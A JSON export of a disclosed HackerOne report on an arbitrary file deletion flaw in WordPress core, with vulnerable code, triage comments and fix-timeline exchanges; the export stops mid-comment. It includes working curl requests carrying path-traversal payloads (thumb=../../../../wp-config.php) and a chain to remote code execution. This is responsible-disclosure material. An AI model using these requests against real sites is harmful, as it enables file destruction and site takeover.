{"id":291878,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTE4Nzg=","url":"https://hackerone.com/reports/291878","title":"Arbitrary file deletion in wp-core - guides towards RCE and information disclosure","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-11-20T13:57:40.409Z","submitted_at":"2017-11-20T13:57:40.409Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"b258ea62bf297b02afa9854","url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-29T13:47:04.950Z","bug_reporter_agreed_on_going_public_at":"2018-07-30T13:47:01.536Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Vulnerable place 1: `wp-admin/post.php`\n`$newmeta['thumb']` is placed into DB not sanitized directly from user input.\n```\ncase 'editattachment':\n    check_admin_referer('update-post_' . $post_id);\n    // Don't let these be changed\n    unset($_POST['guid']);\n    $_POST['post_type'] = 'attachment';\n    // Update the thumbnail filename\n    $newmeta = wp_get_attachment_metadata( $post_id, true );\n    $newmeta['thumb'] = $_POST['thumb'];\n    wp_update_attachment_metadata( $post_id, $newmeta );\n``` \nVulnerable place 2: `wp_delete_attachment` \nThere we have `$meta = wp_get_attachment_metadata( $post_id );` and below in the code:\n```\nif ( ! empty($meta['thumb']) ) {\n        // Don't delete the thumb if another attachment uses it.\n        if (! $wpdb-\u003eget_row( $wpdb-\u003eprepare( \"SELECT meta_id FROM $wpdb-\u003epostmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id \u003c\u003e %d\", '%' . $wpdb-\u003eesc_like( $meta['thumb'] ) . '%', $post_id)) ) {\n            $thumbfile = str_replace(basename($file), $meta['thumb'], $file);\n            /** This filter is documented in wp-includes/functions.php */\n            $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );\n            @ unlink( path_join($uploadpath['basedir'], $thumbfile) );\n        }\n    }\n```\nThis means we can craft any value from the `wp-admin` for `thumb` property and that value to be sent towards `@unlink`\n\nHow to reproduce:\n\n1. Upload image via media menu e.g. new\n2. Go to edit post (old fashioned way)\n3. Grad the `id`, `_wpnonce` and choose your payload `../../../../wp-config.php`\n4. Craft your payload(set auth cookies, ua, referrers, ...): \n```\ncurl 'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]\u0026action=editattachment\u0026_wpnonce=[yournonce]' -H 'place your client headers: ua, cookies in order to mimic the authenticated user ' -d 'thumb=../../../../wp-config-slavco.php' --compressed \n```\n5. Delete the file from the admin\n\nImpact:\n1. Requires user that have permission to manipulate media files / posts\n2. Hard to be spotted because:\n2.1 Payload is deleted from DB\n2.2 `@unlink` won't rise error in case of any failed attempts\n3. Affects many blogging/publishing, e-commerce, ...  setups.\n\nAttack:\n1. Delete `wp-config.php` and relaunch wp setup with remote attackers db - RCE \n2. Delete `.htaccess` or any another `index.html`/`index.php` in order to disclose any stored data under web accessible directory\n","vulnerability_information_html":"\u003cp\u003eVulnerable place 1: \u003ccode\u003ewp-admin/post.php\u003c/code\u003e\u003cbr\u003e\n\u003ccode\u003e$newmeta[\u0026#39;thumb\u0026#39;]\u003c/code\u003e is placed into DB not sanitized directly from user input.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecase \u0026#39;editattachment\u0026#39;:\n    check_admin_referer(\u0026#39;update-post_\u0026#39; . $post_id);\n    // Don\u0026#39;t let these be changed\n    unset($_POST[\u0026#39;guid\u0026#39;]);\n    $_POST[\u0026#39;post_type\u0026#39;] = \u0026#39;attachment\u0026#39;;\n    // Update the thumbnail filename\n    $newmeta = wp_get_attachment_metadata( $post_id, true );\n    $newmeta[\u0026#39;thumb\u0026#39;] = $_POST[\u0026#39;thumb\u0026#39;];\n    wp_update_attachment_metadata( $post_id, $newmeta );\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eVulnerable place 2: \u003ccode\u003ewp_delete_attachment\u003c/code\u003e \u003cbr\u003e\nThere we have \u003ccode\u003e$meta = wp_get_attachment_metadata( $post_id );\u003c/code\u003e and below in the code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif ( ! empty($meta[\u0026#39;thumb\u0026#39;]) ) {\n        // Don\u0026#39;t delete the thumb if another attachment uses it.\n        if (! $wpdb-\u0026gt;get_row( $wpdb-\u0026gt;prepare( \u0026quot;SELECT meta_id FROM $wpdb-\u0026gt;postmeta WHERE meta_key = \u0026#39;_wp_attachment_metadata\u0026#39; AND meta_value LIKE %s AND post_id \u0026lt;\u0026gt; %d\u0026quot;, \u0026#39;%\u0026#39; . $wpdb-\u0026gt;esc_like( $meta[\u0026#39;thumb\u0026#39;] ) . \u0026#39;%\u0026#39;, $post_id)) ) {\n            $thumbfile = str_replace(basename($file), $meta[\u0026#39;thumb\u0026#39;], $file);\n            /** This filter is documented in wp-includes/functions.php */\n            $thumbfile = apply_filters( \u0026#39;wp_delete_file\u0026#39;, $thumbfile );\n            @ unlink( path_join($uploadpath[\u0026#39;basedir\u0026#39;], $thumbfile) );\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis means we can craft any value from the \u003ccode\u003ewp-admin\u003c/code\u003e for \u003ccode\u003ethumb\u003c/code\u003e property and that value to be sent towards \u003ccode\u003e@unlink\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eHow to reproduce:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eUpload image via media menu e.g. new\u003c/li\u003e\n\u003cli\u003eGo to edit post (old fashioned way)\u003c/li\u003e\n\u003cli\u003eGrad the \u003ccode\u003eid\u003c/code\u003e, \u003ccode\u003e_wpnonce\u003c/code\u003e and choose your payload \u003ccode\u003e../../../../wp-config.php\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eCraft your payload(set auth cookies, ua, referrers, ...): \n\u003ccode\u003e\ncurl \u0026#39;http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]\u0026amp;action=editattachment\u0026amp;_wpnonce=[yournonce]\u0026#39; -H \u0026#39;place your client headers: ua, cookies in order to mimic the authenticated user \u0026#39; -d \u0026#39;thumb=../../../../wp-config-slavco.php\u0026#39; --compressed \n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eDelete the file from the admin\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eImpact:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eRequires user that have permission to manipulate media files / posts\u003c/li\u003e\n\u003cli\u003eHard to be spotted because:\n2.1 Payload is deleted from DB\n2.2 \u003ccode\u003e@unlink\u003c/code\u003e won\u0026#39;t rise error in case of any failed attempts\u003c/li\u003e\n\u003cli\u003eAffects many blogging/publishing, e-commerce, ...  setups.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAttack:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eDelete \u003ccode\u003ewp-config.php\u003c/code\u003e and relaunch wp setup with remote attackers db - RCE \u003c/li\u003e\n\u003cli\u003eDelete \u003ccode\u003e.htaccess\u003c/code\u003e or any another \u003ccode\u003eindex.html\u003c/code\u003e/\u003ccode\u003eindex.php\u003c/code\u003e in order to disclose any stored data under web accessible directory\u003c/li\u003e\n\u003c/ol\u003e\n","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-08-29T13:47:01.687Z","allow_singular_disclosure_after":-73669114.8838389,"singular_disclosure_allowed":true,"vote_count":16,"voters":["hunter","inhibitor181","mik317","sameerphad72","r4v","muhammad_uwais","eveeez","apapedulimu","an0nym0us","mefkan","and 6 more..."],"severity":{"rating":"critical","score":9.9,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2750,"asset_type":"SOURCE_CODE","asset_identifier":"WordPress Core","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2170709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @slavco, thank you for reporting this to us. I just wanted to let you know that I'm taking a look at this right now.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e, thank you for reporting this to us. I just wanted to let you know that I\u0026#39;m taking a look at this right now.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-20T17:20:19.514Z","updated_at":"2017-11-20T17:20:19.514Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2176497,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there,\nAny problems with this one? It is reported 2 days ago and status is not changed. If there is something unclear feel free to ask.","markdown_message":"\u003cp\u003eHi there,\u003cbr\u003e\nAny problems with this one? It is reported 2 days ago and status is not changed. If there is something unclear feel free to ask.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T12:46:24.735Z","updated_at":"2017-11-22T12:46:24.735Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176890,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey, sorry about that. I see in the code why this is a problem, but I am having trouble reproducing it. I'm going to go ahead and triage this and keep trying to reproduce it. Thanks again for reporting this.","markdown_message":"\u003cp\u003eHey, sorry about that. I see in the code why this is a problem, but I am having trouble reproducing it. I\u0026#39;m going to go ahead and triage this and keep trying to reproduce it. Thanks again for reporting this.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T16:00:26.031Z","updated_at":"2017-11-22T16:00:26.031Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2177172,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Data you need to place in the request below in order to work attack: \n[THIS DATA YOU NEED FROM YOUR LOCAL TARGET]\n```\ncurl 'http://LOCAL.TARGET/wp-admin/post.php?post=[MEDIA_ID]\u0026action=editattachment\u0026_wpnonce=[WPNONCE_USED_TO_EDIT_MEDIA]' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Cookie: [PLACE YOUR COOKIE VALUES HERE - EXPORT FROM BROWSER]' -H 'Connection: keep-alive' -d 'thumb=../../../../index.php' --compressed\n```\n- [MEDIA_ID] is your post / media ID\n- [WPNONCE_USED_TO_EDIT_MEDIA] change caption of media file and use the same wpnonce for the request above\n- Same applies for cookie values\n\nafter that simply delete permanently file and something like this will be input towards `@unlink` :\n`/your/local/path/wp/wp-content/uploads/2017/11/../../../../index.php`\n","markdown_message":"\u003cp\u003eData you need to place in the request below in order to work attack: \u003cbr\u003e\n[THIS DATA YOU NEED FROM YOUR LOCAL TARGET]\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026#39;http://LOCAL.TARGET/wp-admin/post.php?post=[MEDIA_ID]\u0026amp;action=editattachment\u0026amp;_wpnonce=[WPNONCE_USED_TO_EDIT_MEDIA]\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Accept-Language: en-US,en;q=0.8\u0026#39; -H \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36\u0026#39; -H \u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\u0026#39; -H \u0026#39;Cache-Control: max-age=0\u0026#39; -H \u0026#39;Cookie: [PLACE YOUR COOKIE VALUES HERE - EXPORT FROM BROWSER]\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -d \u0026#39;thumb=../../../../index.php\u0026#39; --compressed\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e[MEDIA_ID] is your post / media ID\u003c/li\u003e\n\u003cli\u003e[WPNONCE_USED_TO_EDIT_MEDIA] change caption of media file and use the same wpnonce for the request above\u003c/li\u003e\n\u003cli\u003eSame applies for cookie values\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eafter that simply delete permanently file and something like this will be input towards \u003ccode\u003e@unlink\u003c/code\u003e :\u003cbr\u003e\n\u003ccode\u003e/your/local/path/wp/wp-content/uploads/2017/11/../../../../index.php\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T17:32:47.358Z","updated_at":"2017-11-22T17:33:09.150Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2177188,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, thank you for the extra information. Looks like I was using the wrong post ID and nonce (using for the post as opposed to the media). I'll try this.\n\nAssuming I can validate this (and I'm sure I will), what is your recommended fix?","markdown_message":"\u003cp\u003eAwesome, thank you for the extra information. Looks like I was using the wrong post ID and nonce (using for the post as opposed to the media). I\u0026#39;ll try this.\u003c/p\u003e\n\n\u003cp\u003eAssuming I can validate this (and I\u0026#39;m sure I will), what is your recommended fix?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T17:39:25.596Z","updated_at":"2017-11-22T17:39:25.596Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2177306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Validate it first, then we can jump into real problem. I would suggest, if possible, your side ( wp core team ) to provide patch then if needed maybe I can say something, but I really doubt it would be taken into consideration :)","markdown_message":"\u003cp\u003eValidate it first, then we can jump into real problem. I would suggest, if possible, your side ( wp core team ) to provide patch then if needed maybe I can say something, but I really doubt it would be taken into consideration :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T18:11:30.861Z","updated_at":"2017-11-22T18:11:30.861Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2177466,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Again, thanks for that extra info, with it I was able to reproduce the issue. I'll start working on a patch and pass it along when I've got something.","markdown_message":"\u003cp\u003eAgain, thanks for that extra info, with it I was able to reproduce the issue. I\u0026#39;ll start working on a patch and pass it along when I\u0026#39;ve got something.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T18:56:50.799Z","updated_at":"2017-11-22T18:56:50.799Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2217767,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What is the status of this one? Any progress? ","markdown_message":"\u003cp\u003eWhat is the status of this one? Any progress? \u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T17:22:35.520Z","updated_at":"2017-12-12T17:22:35.520Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2231905,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @slavco, sorry for the silence on this one. Between school, work, family, and the holidays, I haven't had as much time as I would have hoped to work on this. Initially I thought we could just call `validate_file` on the file path, but currently relative paths are allowed and to disallow all relative paths could break quite a few sites. @jjj had a good idea regarding this. He suggested migrating everything to `wp_delete_file` and not allowing anything outside of ABSPATH to be deleted (with blacklists for wp-config.php and other sensitive files). We could then add a filter to allow those who have WP_CONTENT_DIR outside of ABSPATH to keep working.\n\n\u003e but I really doubt it would be taken into consideration :)\nRegarding that, I'm all ears for you suggestions. I promise that I will consider any suggestions you make. I can't promise that will be the exact fix, but the more view points we have the better.\n\nThank you again for responsible disclosure of this.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e, sorry for the silence on this one. Between school, work, family, and the holidays, I haven\u0026#39;t had as much time as I would have hoped to work on this. Initially I thought we could just call \u003ccode\u003evalidate_file\u003c/code\u003e on the file path, but currently relative paths are allowed and to disallow all relative paths could break quite a few sites. \u003ca href=\"/jjj\"\u003e@jjj\u003c/a\u003e had a good idea regarding this. He suggested migrating everything to \u003ccode\u003ewp_delete_file\u003c/code\u003e and not allowing anything outside of ABSPATH to be deleted (with blacklists for wp-config.php and other sensitive files). We could then add a filter to allow those who have WP_CONTENT_DIR outside of ABSPATH to keep working.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ebut I really doubt it would be taken into consideration :)\u003cbr\u003e\nRegarding that, I\u0026#39;m all ears for you suggestions. I promise that I will consider any suggestions you make. I can\u0026#39;t promise that will be the exact fix, but the more view points we have the better.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThank you again for responsible disclosure of this.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T16:59:36.028Z","updated_at":"2017-12-18T16:59:36.028Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2232011,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice to hear there is work in progress on this one. Any idea regarding release date (I'm not pushing here, just want to know what is expected release date for this fix)","markdown_message":"\u003cp\u003eNice to hear there is work in progress on this one. Any idea regarding release date (I\u0026#39;m not pushing here, just want to know what is expected release date for this fix)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T17:12:32.836Z","updated_at":"2017-12-18T17:12:32.836Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2272455,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all, any activity on this one and release date if possible ?","markdown_message":"\u003cp\u003eHi all, any activity on this one and release date if possible ?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-09T14:36:57.355Z","updated_at":"2018-01-09T14:36:57.355Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2304143,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"Critical issue reported 2 months ago and due the fact the issue is straight forward confirmed, located, verified there isn't even fix proposal or time frame when will be fixed given.  ","markdown_message":"\u003cp\u003eCritical issue reported 2 months ago and due the fact the issue is straight forward confirmed, located, verified there isn\u0026#39;t even fix proposal or time frame when will be fixed given.  \u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-20T22:56:12.013Z","updated_at":"2018-01-20T22:56:12.013Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2304813,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @slavco,\n\nAs @voldemortensen said in his last update, holidays and other commitments have taken up a lot of his time. Unfortunately this is true for quite a few of our volunteers over the last month. Combining that with the fact that this is reproducible but definitely not simple to fix, has meant that things are taking a while. I'll see if I can get someone else to lend a hand to try to speed things up here, but we certainly haven't forgotten about it.\n\nThanks,\nAaron","markdown_message":"\u003cp\u003eHey \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAs \u003ca href=\"/voldemortensen\"\u003e@voldemortensen\u003c/a\u003e said in his last update, holidays and other commitments have taken up a lot of his time. Unfortunately this is true for quite a few of our volunteers over the last month. Combining that with the fact that this is reproducible but definitely not simple to fix, has meant that things are taking a while. I\u0026#39;ll see if I can get someone else to lend a hand to try to speed things up here, but we certainly haven\u0026#39;t forgotten about it.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nAaron\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-21T15:11:42.877Z","updated_at":"2018-01-21T15:11:42.877Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2304843,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Again, I know that backward compatibility is really hard to be achieved and it is time consuming. I'm asking regarding simple time frame e.g. when it is expected to be fixed. That is it. Answer could be:\n- in one month\n- in 6 months\n- in one year\nI really don't care, just want to know rough planned release date. That it is!","markdown_message":"\u003cp\u003eAgain, I know that backward compatibility is really hard to be achieved and it is time consuming. I\u0026#39;m asking regarding simple time frame e.g. when it is expected to be fixed. That is it. Answer could be:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ein one month\u003c/li\u003e\n\u003cli\u003ein 6 months\u003c/li\u003e\n\u003cli\u003ein one year\nI really don\u0026#39;t care, just want to know rough planned release date. That it is!\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2018-01-21T15:47:21.320Z","updated_at":"2018-01-21T15:47:21.320Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2313713,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @slavco,\n\nMy best estimate on this one would be somewhere around the 6 month time frame. Unfortunately we don't actually set release dates that far in advance, so it's hard to give you a date. However, it should be fixed by the end of July. I've set calendar reminders to make sure I check in on this regularly.\n\nThanks,\nAaron\n\n","markdown_message":"\u003cp\u003eHey \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eMy best estimate on this one would be somewhere around the 6 month time frame. Unfortunately we don\u0026#39;t actually set release dates that far in advance, so it\u0026#39;s hard to give you a date. However, it should be fixed by the end of July. I\u0026#39;ve set calendar reminders to make sure I check in on this regularly.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nAaron\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-24T15:14:12.034Z","updated_at":"2018-01-24T15:14:12.034Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2313929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"+1 will ping you in 6 months, before that if something is unclear feel free to poke me here.","markdown_message":"\u003cp\u003e+1 will ping you in 6 months, before that if something is unclear feel free to poke me here.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-24T16:14:33.866Z","updated_at":"2018-01-24T16:14:33.866Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2791422,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, the issue presented here I have found while I was at ripstech. I got an email that they plan to publish it this week or next one. Do you have any info or progress on this one?","markdown_message":"\u003cp\u003eHi, the issue presented here I have found while I was at ripstech. I got an email that they plan to publish it this week or next one. Do you have any info or progress on this 